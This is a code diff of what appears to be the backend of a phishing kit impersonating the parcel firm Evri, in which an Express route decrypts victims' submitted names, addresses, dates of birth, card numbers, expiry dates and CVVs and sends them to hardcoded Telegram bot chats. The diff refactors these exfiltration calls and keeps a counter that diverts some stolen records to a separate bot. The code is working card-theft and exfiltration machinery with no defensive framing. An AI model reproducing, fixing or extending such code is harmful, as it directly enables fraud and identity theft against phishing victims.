@@ -12695,12 +12695,12 @@ app.post("/YardzUnitEvri", (req, res) => {
   cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
+  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+  //   CryptoJS.enc.Utf8
+  // );
+  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+  //   CryptoJS.enc.Utf8
+  // );
   userAgent = req.body.userAgent;
   ip = req.body.ip;
   bin = req.body.bin;
@@ -12723,24 +12723,60 @@ app.post("/YardzUnitEvri", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (yardzCount == 10) {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
-        );
-        capzEvri = 5;
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        yardzCount = 5;
       } else if (bin === "542011") {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
-        );
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
       } else {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCapz:\n${originalText}`
-        );
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5138777422&text=Evri:\n${originalText}`
-        );
-        capzEvri += 1;
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `EvriYardz:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 5138777422,
+              text: `Evri:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        yardzCount += 1;
       }
 
       res.send("Update Completed");
